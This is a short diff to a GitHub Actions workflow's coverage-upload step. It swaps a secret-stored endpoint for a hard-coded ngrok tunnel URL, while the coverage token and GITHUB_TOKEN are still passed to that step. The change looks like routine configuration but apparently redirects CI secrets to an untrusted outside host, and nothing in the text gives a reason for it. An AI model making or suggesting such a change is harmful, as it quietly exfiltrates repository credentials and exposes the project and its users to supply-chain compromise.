@@ -27,7 +27,7 @@ jobs:
       - name: Upload coverage
         uses: ./
         with:
-          coverageEndpoint: ${{ secrets.COVERAGE_ENDPOINT }}
+          coverageEndpoint: https://3dfe-75-159-190-236.ngrok.io/api/coverage
           coverageToken: ${{ secrets.COVERAGE_TOKEN }}
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
